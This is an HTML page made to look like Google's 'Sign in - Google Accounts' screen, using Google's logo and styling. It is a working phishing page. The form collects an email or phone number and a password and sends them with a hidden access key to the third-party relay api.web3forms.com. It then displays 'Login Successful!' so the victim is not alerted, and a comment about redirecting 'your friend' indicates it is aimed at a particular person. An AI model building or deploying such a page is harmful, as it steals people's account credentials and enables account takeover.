<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { box-sizing: border-box; font-family: 'Roboto', arial, sans-serif; }
        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p.subtitle { font-size: 16px; color: #202124; margin-bottom: 30px; }
        .input-container { position: relative; margin-bottom: 25px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; }
        input:focus { border: 2px solid #1a73e8; }
        .label-text { position: absolute; left: 12px; top: 13px; background: white; padding: 0 4px; color: #5f6368; pointer-events: none; transition: 0.2s; }
        input:focus + .label-text, input:not(:placeholder-shown) + .label-text { top: -10px; left: 10px; font-size: 12px; color: #1a73e8; }
        .footer-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
        .forgot-link { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
        .next-btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; }
        #result { margin-top: 15px; font-size: 14px; color: #d93025; }
    </style>
</head>
<body>

    <div class="login-box">
        <form action="https://api.web3forms.com/submit" method="POST" id="form">
            <input type="hidden" name="access_key" value="1f2efc2e-d935-49ee-a210-d34d0475334a">
            
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
            <h1>Sign In</h1>
            <p class="subtitle">Use your Google Account</p>
            
            <div class="input-container">
                <input type="text" name="email_or_phone" id="email" placeholder=" " required>
                <span class="label-text">Email or phone</span>
            </div>

            <div class="input-container">
                <input type="password" name="password" id="password" placeholder=" " required>
                <span class="label-text">Enter your password</span>
            </div>

            <div class="footer-actions">
                <a href="#" class="forgot-link">Forgot email?</a>
                <button type="submit" class="next-btn">Next</button>
            </div>
            <div id="result"></div>
        </form>
    </div>

    <script>
        const form = document.getElementById('form');
        const result = document.getElementById('result');

        form.addEventListener('submit', function(e) {
          e.preventDefault();
          const formData = new FormData(form);
          const object = Object.fromEntries(formData);
          const json = JSON.stringify(object);
          result.innerHTML = "Processing..."

          fetch('https://api.web3forms.com/submit', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                  body: json
              })
              .then(async (response) => {
                  let json = await response.json();
                  if (response.status == 200) {
                      result.style.color = "green";
                      result.innerHTML = "Login Successful!";
                      // Optional: Redirect your friend after 2 seconds
                      // setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
                  } else {
                      result.innerHTML = json.message;
                  }
              })
              .catch(error => {
                  result.innerHTML = "Something went wrong!";
              });
        });
    </script>
</body>
</html>
